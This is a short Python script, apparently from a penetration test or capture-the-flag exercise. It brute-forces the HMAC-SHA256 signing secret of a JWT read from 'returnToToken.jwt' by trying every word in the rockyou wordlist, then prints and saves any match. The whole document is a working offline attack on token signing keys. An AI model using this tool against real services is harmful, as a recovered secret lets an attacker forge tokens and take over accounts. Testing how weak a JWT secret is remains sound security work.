import hmac,hashlib,base64,sys,time
tok=open('returnToToken.jwt').read().strip()
h,p,s=tok.split('.')
si=(h+'.'+p).encode(); sig=base64.urlsafe_b64decode(s+'='*(-len(s)%4))
t0=time.time();n=0
with open('/usr/share/wordlists/rockyou.txt','rb') as f:
    for line in f:
        w=line.rstrip(b'\n'); n+=1
        if hmac.new(w,si,hashlib.sha256).digest()==sig:
            print("SECRET_FOUND:",w.decode('latin1'));open('SECRET_FOUND.txt','wb').write(w);sys.exit(0)
        if n%1000000==0: print(f"...{n} tried {int(n/(time.time()-t0))}/s",flush=True)
print(f"[-] rockyou exhausted, {n} tried, no match")
